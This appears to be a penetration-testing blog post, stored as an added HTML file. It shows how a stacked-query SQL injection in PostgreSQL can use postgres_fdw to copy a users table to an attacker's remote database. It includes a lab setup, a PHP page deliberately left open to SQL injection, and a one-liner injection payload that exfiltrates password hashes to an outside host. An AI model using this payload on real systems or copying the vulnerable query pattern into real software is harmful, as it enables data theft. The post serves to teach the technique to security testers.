@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="reversebrain">
+
+
+
+
+
+<title>Cross-Queries: When my SQL Injection Took a Remote Vacation | reversebrain</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Cybersecurity Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Cybersecurity Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Cross-Queries: When my SQL Injection Took a Remote Vacation</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">reversebrain</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">19/9/2024&nbsp;&nbsp;11:29:38</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>During a Penetration Test for one of my Clients, I discovered a blind SQL Injection on a PostgreSQL database but data retrieval was extremely slow, so any boolean or time based approach would have been completely useless. Then me and my colleagues decided to find another way to dump the database and we discovered the magic of cross-queries.</p>
+<h1 id="What-is-a-cross-query"><a href="#What-is-a-cross-query" class="headerlink" title="What is a cross-query?"></a>What is a cross-query?</h1><p>A cross-query is an SQL query that spans more than one database. Instead of pulling data from a single source, you reach across the network and grab data from another database server.<br>In PostgreSQL, this can be accomplished using the <code>postgres_fdw</code> extension, which allows one database to query another one remotely:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> EXTENSION postgres_fdw;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> SERVER foreign_server</span><br><span class="line">        <span class="keyword">FOREIGN</span> DATA WRAPPER postgres_fdw</span><br><span class="line">        OPTIONS (host <span class="string">&#x27;192.83.123.89&#x27;</span>, port <span class="string">&#x27;5432&#x27;</span>, dbname <span class="string">&#x27;foreign_db&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> MAPPING <span class="keyword">FOR</span> local_user</span><br><span class="line">        SERVER foreign_server</span><br><span class="line">        OPTIONS (<span class="keyword">user</span> <span class="string">&#x27;foreign_user&#x27;</span>, password <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FOREIGN</span> <span class="keyword">TABLE</span> foreign_table (</span><br><span class="line">        id <span class="type">integer</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">        data text</span><br><span class="line">)</span><br><span class="line">        SERVER foreign_server</span><br><span class="line">        OPTIONS (schema_name <span class="string">&#x27;some_schema&#x27;</span>, table_name <span class="string">&#x27;some_table&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> foreign_table;</span><br></pre></td></tr></table></figure>
+<p>In this example, a query is being executed on a remote database and the results are retrieved as if they were part of the local database. But we can also do the opposite, select data locally and insert it into a remote database!</p>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h2 id="Setup-the-Production-Environment"><a href="#Setup-the-Production-Environment" class="headerlink" title="Setup the Production Environment"></a>Setup the Production Environment</h2><p>To reproduce the environment, I created an Ubuntu Server with PostgreSQL and a simple, very simple, PHP website vulnerable to SQL Injection, everythig packed up in Docker containers.<br>This is the <code>docker-compose.yml</code> file which instructs <code>docker compose</code> to create <code>postgres</code>, <code>nginx</code> and <code>php-fpm</code> containers: </p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">postgres:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">postgres</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">POSTGRES_PASSWORD:</span> <span class="string">&quot;postgres&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;5432:5432&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/home/ubuntu/init.sql:/docker-entrypoint-initdb.d/init.sql</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/home/ubuntu/html:/var/www/html</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/home/ubuntu/nginx.conf:/etc/nginx/nginx.conf</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/home/ubuntu/default.conf:/etc/nginx/conf.d/default.conf</span></span><br><span class="line">  <span class="attr">php:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">.</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">php-fpm</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/home/ubuntu/html:/var/www/html</span></span><br></pre></td></tr></table></figure>
+<p>The <code>Dockerfile</code> of <code>php-fpm</code> container simply uses the <code>php:8-fpm-alpine</code> base base image and installs the <code>pgsql</code> extension to use PostgreSQL functions in PHP:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">FROM</span> <span class="string">php:8-fpm-alpine</span></span><br><span class="line"></span><br><span class="line"><span class="string">RUN</span> <span class="string">apk</span> <span class="string">add</span> <span class="string">--no-cache</span> <span class="string">postgresql-dev</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">docker-php-ext-install</span> <span class="string">pgsql</span></span><br><span class="line"></span><br><span class="line"><span class="string">EXPOSE</span> <span class="number">9000</span></span><br><span class="line"><span class="string">CMD</span> [<span class="string">&quot;php-fpm&quot;</span>]</span><br></pre></td></tr></table></figure>
+<p>The <code>nginx</code> configuration is very basic, I instruct <code>nginx</code> to use <code>/var/www/html</code> as document root and redirect every <code>.php</code> files invoked from the browser to the <code>php-fpm</code> container listening at port 9000. No HTTPS, no compression or other “advanced” configurations have been made.<br><code>nginx.conf</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">user  nginx;</span><br><span class="line">worker_processes  auto;</span><br><span class="line"></span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       /etc/nginx/mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>default.conf</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /var/www/html;</span><br><span class="line">        index  index.php index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        root           /var/www/html;</span><br><span class="line">        fastcgi_pass   php-fpm:9000;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The database is initialized with <code>init.sql</code> script which creates the database <code>production</code> with the tables <code>users</code> and <code>items</code> and random data:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE &quot;production&quot;;</span><br><span class="line"></span><br><span class="line">\c production;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">        id SERIAL <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">        username <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">        password <span class="type">CHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> items (</span><br><span class="line">        id SERIAL <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">        name <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">        description <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> items <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;item1&#x27;</span>, <span class="string">&#x27;lorem ipsum dolor sit amet&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> items <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;item2&#x27;</span>, <span class="string">&#x27;consectetur adipiscing elit&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Finally, this is the source code of the vulnerable PHP page:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Item Search&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Search <span class="keyword">for</span> an Item&lt;/h2&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;GET&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;item_name&quot;</span>&gt;Item Name:&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;item_name&quot;</span> name=<span class="string">&quot;item_name&quot;</span> required&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Search&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;item_name&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$item_name</span> = <span class="variable">$_GET</span>[<span class="string">&quot;item_name&quot;</span>];</span><br><span class="line">        <span class="variable">$conn_string</span> = <span class="string">&quot;host=postgres dbname=production user=postgres password=postgres&quot;</span>;</span><br><span class="line">        <span class="variable">$dbconn</span> = <span class="title function_ invoke__">pg_connect</span>(<span class="variable">$conn_string</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$dbconn</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Error: Unable to connect to the database.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;SELECT COUNT(*) FROM items WHERE name LIKE &#x27;%<span class="subst">$item_name</span>%&#x27;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">pg_query</span>(<span class="variable">$dbconn</span>, <span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">                <span class="variable">$row</span> = <span class="title function_ invoke__">pg_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line">                <span class="variable">$count</span> = <span class="variable">$row</span>[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of items found: <span class="subst">$count</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Error: &quot;</span> . <span class="title function_ invoke__">pg_last_error</span>(<span class="variable">$dbconn</span>) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">pg_close</span>(<span class="variable">$dbconn</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>At this point, the production environment is set. We have our <code>production</code> database ready to be queried by our PHP script, invoked from our <code>nginx</code> reverse proxy. </p>
+<h2 id="Setup-the-Attacker-Environment"><a href="#Setup-the-Attacker-Environment" class="headerlink" title="Setup the Attacker Environment"></a>Setup the Attacker Environment</h2><p>Since we want to exfiltrate data from the <code>production</code> database, we also need to setup a database into our attacking environment, which can be our laptop if we are inside the same LAN or onto the cloud for more complex scenarios. For simplicty, the two databases will be on the same network.<br>We can use the same <code>init.sql</code> script for database initialization without the <code>INSERT INTO</code> statements, since we only want the same tables structure, and we can run the container with:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name postgres --rm -v /home/kali/init.sql:/docker-entrypoint-initdb.d/init.sql -e &quot;POSTGRES_PASSWORD=postgres&quot; -p 5432:5432 postgres:alpine </span><br></pre></td></tr></table></figure>
+<p><code>init.sql</code>:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE &quot;exfiltration&quot;;</span><br><span class="line"></span><br><span class="line">\c exfiltration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> remote_users (</span><br><span class="line">        id SERIAL <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">        username <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">        password <span class="type">CHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> remote_items (</span><br><span class="line">        id SERIAL <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">        name <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">        description <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>Note that the database name in the attacker environment is called <code>exfiltration</code> and table names are prefixed with <code>remote_</code>.<br>Now, both production and attacker environments are set and we can jump into exploitation phase.</p>
+<h2 id="Cross-Query-Abuse"><a href="#Cross-Query-Abuse" class="headerlink" title="Cross-Query Abuse"></a>Cross-Query Abuse</h2><p>Let’s start our containers in the production server with <code>docker compose up</code> and interact with the website, confirming the presence of the SQL Injection:<br><img src="/2024/09/19/Cross-Queries-When-my-SQL-Injection-Took-a-Remote-Vacation/sqli_1.png"></p>
+<p>We also can confirm that stacked-queries are working, in fact if we break the query and we do a <code>SELECT 1</code>, the query returns <code>1</code> as <code>COUNT</code> operation result:<br><img src="/2024/09/19/Cross-Queries-When-my-SQL-Injection-Took-a-Remote-Vacation/sqli_2.png"></p>
+<p>Well, we have an SQL Injection now but suppose that, for obscure reasons, the boolean-based and timed-based techniques are very slow and also PHP errors are not displayed on the page. There is another way to dump the data? Yes! Cross-Queries!</p>
+<p>As written in the introduction, we can use <code>postgres_fdw</code> from PostgreSQL to interact we other databases:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> EXTENSION postgres_fdw;</span><br><span class="line"><span class="keyword">CREATE</span> SERVER exfiltration_server <span class="keyword">FOREIGN</span> DATA WRAPPER postgres_fdw OPTIONS (host <span class="string">&#x27;192.168.100.195&#x27;</span>, dbname <span class="string">&#x27;exfiltration&#x27;</span>, port <span class="string">&#x27;5432&#x27;</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> MAPPING <span class="keyword">FOR</span> postgres SERVER exfiltration_server OPTIONS (<span class="keyword">user</span> <span class="string">&#x27;postgres&#x27;</span>, password <span class="string">&#x27;postgres&#x27;</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FOREIGN</span> <span class="keyword">TABLE</span> remote_users (id <span class="type">INTEGER</span>, username TEXT, password TEXT) SERVER exfiltration_server;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> remote_users <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
+
+<p>The above query creates the extension <code>postgres_fdw</code>, then creates the mapping for the remote server and the local user, finally creates a foreign table mapping and copies the local table <code>users</code> into the remote table <code>remote_users</code>. For our scenario, we can simply convert the query into a one-liner:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; CREATE EXTENSION postgres_fdw; CREATE SERVER exfiltration_server FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host &#x27;192.168.100.195&#x27;, dbname &#x27;exfiltration&#x27;, port &#x27;5432&#x27;); CREATE USER MAPPING FOR postgres SERVER exfiltration_server OPTIONS (user &#x27;postgres&#x27;, password &#x27;postgres&#x27;); CREATE FOREIGN TABLE remote_users (id INTEGER, username TEXT, password TEXT) SERVER exfiltration_server; INSERT INTO remote_users SELECT * FROM users;-- -</span><br></pre></td></tr></table></figure>
+
+<p>After the injection, we can check our remote database and we discover that the entire <code>users</code> table has been dumped correctly:<br><img src="/2024/09/19/Cross-Queries-When-my-SQL-Injection-Took-a-Remote-Vacation/sqli_3.png"></p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Cross-queries can be incredibly powerful but also pose significant security risks. From a penetration testing perspective, attackers can use cross-queries as another way to gain unauthorized access to sensitive data, especially if database permissions and network rules are poorly configured.<br>The only requirements for this attack scenario are stacked queries and <code>CREATE EXTENSION</code> permission enabled, which is worth mentioning being available by default only to the <code>superuser</code> role. </p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2021/03/29/The-story-of-Nginx-and-uri-variable/">The story of Nginx $uri variable and CRLF injection</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© reversebrain | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
